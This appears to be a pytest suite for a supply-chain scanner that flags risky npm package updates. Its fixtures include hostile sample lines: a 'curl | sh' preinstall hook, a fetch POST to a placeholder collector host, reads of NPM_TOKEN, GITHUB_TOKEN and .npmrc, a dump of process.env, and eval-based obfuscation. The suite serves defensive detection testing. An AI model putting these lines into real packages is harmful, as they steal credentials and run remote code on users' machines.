"""One positive and one negative case per rule, plus the "pre-existing code" guarantee."""

from __future__ import annotations

import base64
import random
from datetime import datetime, timedelta, timezone

import pytest

from helpers import make_ctx, package_json, rules_of
from lockguard.models import IntegrityFailure, Severity
from lockguard.rules import RULES, run_rules
from lockguard.rules import install_scripts as install_scripts_rule
from lockguard.rules import integrity_mismatch as integrity_rule
from lockguard.rules import network_access as network_rule
from lockguard.rules import new_binaries as binaries_rule
from lockguard.rules import obfuscation as obfuscation_rule
from lockguard.rules import process_exec as process_rule
from lockguard.rules import provenance_dropped as provenance_rule
from lockguard.rules import publisher_change as publisher_rule
from lockguard.rules import secret_access as secret_rule
from lockguard.rules import suspicious_bump as bump_rule
from lockguard.rules import unexpected_source as source_rule

BASE_JS = "'use strict';\nfunction add(a, b) {\n  return a + b;\n}\nmodule.exports = { add };\n"


def with_line(line: str, base: str = BASE_JS) -> str:
    return base + line + "\n"


def blob(n_bytes: int = 600, seed: int = 7) -> str:
    return base64.b64encode(random.Random(seed).randbytes(n_bytes)).decode()


def test_all_rules_are_registered() -> None:
    assert set(RULES) >= {
        "install_scripts",
        "network_access",
        "process_exec",
        "secret_access",
        "obfuscation",
        "new_binaries",
        "publisher_change",
        "provenance_dropped",
        "suspicious_bump",
        "integrity_mismatch",
        "unexpected_source",
    }


def test_a_crashing_rule_becomes_a_finding() -> None:
    from lockguard.rules import Rule

    def boom(_ctx):  # type: ignore[no-untyped-def]
        raise RuntimeError("bad heuristic")

    ctx = make_ctx({}, {"index.js": "x"})
    [finding] = run_rules(ctx, {"boom": Rule("boom", "", "", boom)})
    assert finding.severity is Severity.LOW and "RuntimeError" in finding.message


def test_install_scripts_positive_and_critical_escalation() -> None:
    old = {"package.json": package_json(), "index.js": BASE_JS}
    new = {
        "package.json": package_json(scripts={"postinstall": "node setup.js"}),
        "index.js": BASE_JS,
        "setup.js": "console.log(1)",
    }
    [finding] = install_scripts_rule.check(make_ctx(old, new))
    assert finding.severity is Severity.CRITICAL
    assert "setup.js" in finding.message and finding.file == "package.json" and finding.line


def test_install_scripts_downloader_is_critical() -> None:
    new = {"package.json": package_json(scripts={"preinstall": "curl -s https://x.invalid | sh"})}
    [finding] = install_scripts_rule.check(make_ctx({"package.json": package_json()}, new))
    assert finding.severity is Severity.CRITICAL


def test_install_scripts_negative_unchanged_script() -> None:
    pkg = package_json(scripts={"postinstall": "node install.js", "test": "jest"})
    old = {"package.json": pkg, "install.js": "a()"}
    new = {"package.json": pkg, "install.js": "a()\nb()"}
    assert install_scripts_rule.check(make_ctx(old, new)) == []


def test_install_scripts_new_package_is_high_not_critical() -> None:
    new = {"package.json": package_json(scripts={"install": "node-gyp rebuild"}), "a.js": "x"}
    [finding] = install_scripts_rule.check(make_ctx(None, new))
    assert finding.severity is Severity.HIGH


def test_install_scripts_binding_gyp_is_implicit_install() -> None:
    old = {"package.json": package_json()}
    new = {"package.json": package_json(), "binding.gyp": "{}"}
    assert [f.severity for f in install_scripts_rule.check(make_ctx(old, new))] == [Severity.HIGH]


def test_network_access_positive() -> None:
    new = {"index.js": with_line("fetch('https://collector.example.net/x', { method: 'POST' });")}
    findings = network_rule.check(make_ctx({"index.js": BASE_JS}, new))
    assert [f.severity for f in findings] == [Severity.HIGH]
    assert "collector.example.net" in findings[0].message


def test_network_access_raw_ip_is_high() -> None:
    new = {"index.js": with_line("const target = 'http://8.8.4.4:8080/c';")}
    [finding] = network_rule.check(make_ctx({"index.js": BASE_JS}, new))
    assert finding.severity is Severity.HIGH and "8.8.4.4" in finding.message


def test_network_access_negative() -> None:
    new = {
        "index.js": with_line(
            "// see https://github.com/foo/bar and fetch() docs\n"
            "const v = 'v1.2.3.4', local = 'http://127.0.0.1:3000/';"
        )
    }
    assert network_rule.check(make_ctx({"index.js": BASE_JS}, new)) == []


def test_network_access_existing_capability_is_low() -> None:
    old = {"index.js": with_line("fetch(url);")}
    new = {"index.js": with_line("fetch(url);\nfetch(other);", BASE_JS)}
    findings = network_rule.check(make_ctx(old, new))
    assert [f.severity for f in findings] == [Severity.LOW]


def test_process_exec_positive() -> None:
    new = {"index.js": with_line("require('child_process').execSync('id');")}
    [finding] = process_rule.check(make_ctx({"index.js": BASE_JS}, new))
    assert finding.severity is Severity.HIGH


def test_process_exec_negative_regex_exec() -> None:
    new = {"index.js": with_line("const m = /a(b)/.exec(input); function exec(x) { return x; }")}
    assert process_rule.check(make_ctx({"index.js": BASE_JS}, new)) == []


@pytest.mark.parametrize(
    "line, expected",
    [
        ("const t = process.env.NPM_TOKEN;", "NPM_TOKEN"),
        ("const t = process.env['GITHUB_TOKEN'];", "GITHUB_TOKEN"),
        ("send(JSON.stringify(process.env));", "whole process.env"),
        ("read(path.join(os.homedir(), '.npmrc'));", ".npmrc"),
        ("if (window.ethereum) hook();", "window.ethereum"),
        ("const re = /0x[a-fA-F0-9]{40}/;", "Ethereum address regex"),
    ],
)
def test_secret_access_positive(line: str, expected: str) -> None:
    findings = secret_rule.check(make_ctx({"index.js": BASE_JS}, {"index.js": with_line(line)}))
    assert findings and findings[0].severity is Severity.HIGH
    assert expected in findings[0].message


def test_secret_access_negative() -> None:
    new = {"index.js": with_line("const dev = process.env.NODE_ENV !== 'production';")}
    assert secret_rule.check(make_ctx({"index.js": BASE_JS}, new)) == []


def test_secret_access_homedir_needs_a_file_read() -> None:
    new = {"index.js": with_line("const home = os.homedir();")}
    assert secret_rule.check(make_ctx({"index.js": BASE_JS}, new)) == []
    new = {"index.js": with_line("const d = fs.readFileSync(path.join(os.homedir(), 'x'));")}
    assert secret_rule.check(make_ctx({"index.js": BASE_JS}, new))


def test_obfuscation_base64_blob() -> None:
    new = {"index.js": with_line(f"const p = '{blob()}';")}
    findings = obfuscation_rule.check(make_ctx({"index.js": BASE_JS}, new))
    assert findings[0].severity is Severity.HIGH
    assert "base64 string of 800 chars" in findings[0].message


@pytest.mark.parametrize(
    "line, fragment",
    [
        ("eval(payload);", "eval()"),
        ("const f = new Function('a', body);", "Function constructor"),
        ("vm.runInThisContext(code);", "vm module"),
        ("const s = '" + "\\x41" * 25 + "';", "hex escape"),
        ("var _0x1a2b=1,_0x2b3c=2,_0x3c4d=3,_0x4d5e=4,_0x5e6f=5;", "obfuscator-style"),
    ],
)
def test_obfuscation_positive(line: str, fragment: str) -> None:
    findings = obfuscation_rule.check(
        make_ctx({"index.js": BASE_JS}, {"index.js": with_line(line)})
    )
    assert any(fragment in f.message and f.severity is Severity.HIGH for f in findings), findings


def test_obfuscation_high_entropy_string() -> None:
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*-_=+.;:"
    rng = random.Random(3)
    secret = "".join(rng.choice(alphabet) for _ in range(150))
    new = {"index.js": with_line(f'const k = "{secret}";')}
    [finding] = obfuscation_rule.check(make_ctx({"index.js": BASE_JS}, new))
    assert "high-entropy string of 150 chars" in finding.message


def test_obfuscation_long_line_only_when_not_minified_before() -> None:
    long_line = "var a=[" + ",".join(str(i % 10) for i in range(700)) + "];"
    fresh = obfuscation_rule.check(
        make_ctx({"index.js": BASE_JS}, {"index.js": with_line(long_line)})
    )
    assert any("not minified before" in f.message for f in fresh)
    minified_old = {"index.js": "var z=[" + ",".join("1" for _ in range(700)) + "];\n"}
    minified_new = {"index.js": "var z=[" + ",".join("1" for _ in range(700)) + "];\n" + long_line}
    assert obfuscation_rule.check(make_ctx(minified_old, minified_new)) == []


def test_obfuscation_negative() -> None:
    new = {
        "index.js": with_line(
            "const g = Function('return this')();\n"
            "const msg = 'This is a perfectly ordinary and rather long error message that explains "
            "what went wrong in plain English words.';\n"
            "const img = 'data:image/png;base64," + blob() + "';"
        )
    }
    assert obfuscation_rule.check(make_ctx({"index.js": BASE_JS}, new)) == []


def test_new_binaries_positive() -> None:
    new = {
        "index.js": BASE_JS,
        "build/Release/addon.node": b"\x7fELF\x00\x01",
        "blob.bin2": b"\x00\x01",
    }
    findings = binaries_rule.check(make_ctx({"index.js": BASE_JS}, new))
    assert {f.file for f in findings} == {"build/Release/addon.node", "blob.bin2"}
    assert all(f.severity is Severity.MEDIUM for f in findings)


def test_new_binaries_negative_images_and_unchanged() -> None:
    old = {"index.js": BASE_JS, "prebuilt/x.node": b"\x00same"}
    new = {"index.js": BASE_JS, "prebuilt/x.node": b"\x00same", "logo.png": b"\x89PNG\x00"}
    assert binaries_rule.check(make_ctx(old, new)) == []


def meta(user: str, attest: bool = False) -> dict[str, object]:
    dist: dict[str, object] = {"attestations": {"url": "x"}} if attest else {}
    return {"_npmUser": {"name": user, "email": f"{user}@example.invalid"}, "dist": dist}


def test_publisher_change_positive() -> None:
    packument = {
        "versions": {"1.0.0": meta("alice"), "1.0.1": meta("mallory")},
        "time": {"1.0.0": "2025-01-01T00:00:00Z", "1.0.1": "2025-02-01T00:00:00Z"},
    }
    ctx = make_ctx({}, {}, old_meta=meta("alice"), new_meta=meta("mallory"), packument=packument)
    [finding] = publisher_rule.check(ctx)
    assert finding.severity is Severity.HIGH
    assert 'published by "mallory", previous versions by "alice"' in finding.message


def test_publisher_change_known_co_maintainer_is_low() -> None:
    packument = {
        "versions": {"0.9.0": meta("bob"), "1.0.0": meta("alice"), "1.0.1": meta("bob")},
        "time": {"0.9.0": "2024-01-01", "1.0.0": "2025-01-01", "1.0.1": "2025-02-01"},
    }
    ctx = make_ctx({}, {}, old_meta=meta("alice"), new_meta=meta("bob"), packument=packument)
    assert [f.severity for f in publisher_rule.check(ctx)] == [Severity.LOW]


def test_publisher_change_negative() -> None:
    ctx = make_ctx({}, {}, old_meta=meta("alice"), new_meta=meta("alice"))
    assert publisher_rule.check(ctx) == []
    assert publisher_rule.publisher_of({"_npmUser": "carol <c@x.invalid>"}) == "carol"


def test_provenance_dropped_positive() -> None:
    ctx = make_ctx({}, {}, old_meta=meta("a", attest=True), new_meta=meta("a"))
    [finding] = provenance_rule.check(ctx)
    assert finding.severity is Severity.HIGH


def test_provenance_dropped_negative() -> None:
    assert (
        provenance_rule.check(make_ctx({}, {}, old_meta=meta("a", True), new_meta=meta("a", True)))
        == []
    )
    assert provenance_rule.check(make_ctx({}, {}, old_meta=meta("a"), new_meta=meta("a"))) == []


def test_suspicious_bump_growth_and_new_directories() -> None:
    added = "\n".join(f"const v{i} = {i};" for i in range(40))
    old = {"index.js": BASE_JS}
    new = {"index.js": BASE_JS + added + "\n", "hidden/payload/run.js": "x()"}
    findings = bump_rule.check(make_ctx(old, new, old_version="1.0.0", new_version="1.0.1"))
    messages = " | ".join(f.message for f in findings)
    assert "patch bump adds" in messages and "hidden/payload/" in messages
    assert all(f.severity is Severity.MEDIUM for f in findings)


def test_suspicious_bump_fresh_release() -> None:
    now = datetime(2025, 9, 8, 15, 0, tzinfo=timezone.utc)
    published = (now - timedelta(hours=3)).isoformat().replace("+00:00", "Z")
    ctx = make_ctx({}, {}, packument={"time": {"1.0.1": published}}, now=now)
    [finding] = bump_rule.check(ctx)
    assert "3 hours ago" in finding.message


def test_suspicious_bump_negative() -> None:
    old = {"index.js": BASE_JS, "lib/a.js": "a()"}
    new = {"index.js": BASE_JS.replace("a + b", "b + a"), "lib/b.js": "b()"}
    ctx = make_ctx(old, new, packument={"time": {"1.0.1": "2020-01-01T00:00:00Z"}})
    assert bump_rule.check(ctx) == []
    # Major bumps may legitimately rewrite everything.
    big = {"index.js": BASE_JS + "\n".join(f"x{i}()" for i in range(100)), "new/dir.js": "y"}
    assert bump_rule.check(make_ctx(old, big, new_version="2.0.0")) == []


def test_integrity_mismatch_positive() -> None:
    failure = IntegrityFailure("new", "1.0.1", "sha512-expected", "sha512-actual", "lockfile")
    [finding] = integrity_rule.check(make_ctx({}, {}, integrity_failures=[failure]))
    assert finding.severity is Severity.CRITICAL and "lockfile integrity" in finding.message


def test_integrity_mismatch_negative() -> None:
    assert integrity_rule.check(make_ctx({}, {})) == []


def test_unexpected_source_positive() -> None:
    evil = make_ctx(
        {}, {}, name="a", new_version="1.0.0", new_resolved="https://evil.example/a.tgz"
    )
    assert [f.severity for f in source_rule.check(evil)] == [Severity.HIGH]
    other = make_ctx(
        {},
        {},
        name="a",
        new_version="1.0.0",
        new_resolved="https://registry.npmjs.org/evil/-/evil-6.6.6.tgz",
    )
    assert [f.severity for f in source_rule.check(other)] == [Severity.HIGH]


def test_unexpected_source_negative() -> None:
    ok = make_ctx(
        {},
        {},
        name="@s/a",
        new_version="1.0.0",
        new_resolved="https://registry.npmjs.org/@s/a/-/a-1.0.0.tgz",
    )
    assert source_rule.check(ok) == []


SUSPICIOUS_OLD_CODE = "\n".join(
    [
        "'use strict';",
        "const cp = require('child_process');",
        "cp.execSync('echo hi');",
        "fetch('https://collector.example.net/x');",
        "const t = process.env.NPM_TOKEN;",
        "if (window.ethereum) {}",
        "eval(code);",
        f"const p = '{blob()}';",
        "module.exports = {};",
    ]
)


def test_no_rule_flags_pre_existing_unchanged_code() -> None:
    old = {
        "index.js": SUSPICIOUS_OLD_CODE,
        "package.json": package_json(scripts={"postinstall": "node x.js"}),
    }
    # Same code, re-indented and moved into another file, plus one harmless new line.
    moved = "\n".join("  " + line for line in SUSPICIOUS_OLD_CODE.splitlines()[:5])
    new = {
        "index.js": SUSPICIOUS_OLD_CODE + "\nconst harmless = 1 + 1;\n",
        "lib/moved.js": moved,
        "package.json": package_json(scripts={"postinstall": "node x.js"}),
    }
    ctx = make_ctx(old, new)
    findings = [f for f in run_rules(ctx) if f.rule != "suspicious_bump"]
    assert findings == [], findings
    assert rules_of(run_rules(ctx)) <= {"suspicious_bump"}


def test_obfuscation_invisible_unicode() -> None:
    hidden = "\ufe01\ufe02\ufe03\ufe04" * 8
    new = {"index.js": with_line(f"const s = '{hidden}';")}
    findings = obfuscation_rule.check(make_ctx({"index.js": BASE_JS}, new))
    assert any("invisible Unicode" in f.message and f.severity is Severity.HIGH for f in findings)


def test_network_access_private_ips_are_ignored() -> None:
    new = {"index.js": with_line("const nets = ['10.0.0.1', '192.168.1.1', '169.254.0.0/16'];")}
    assert network_rule.check(make_ctx({"index.js": BASE_JS}, new)) == []


def test_new_dependency_capabilities_are_capped_at_medium() -> None:
    new = {"index.js": "require('child_process').execSync('git status');\nfetch(url);\n"}
    findings = run_rules(make_ctx(None, new))
    assert findings and max(f.severity for f in findings) is Severity.MEDIUM
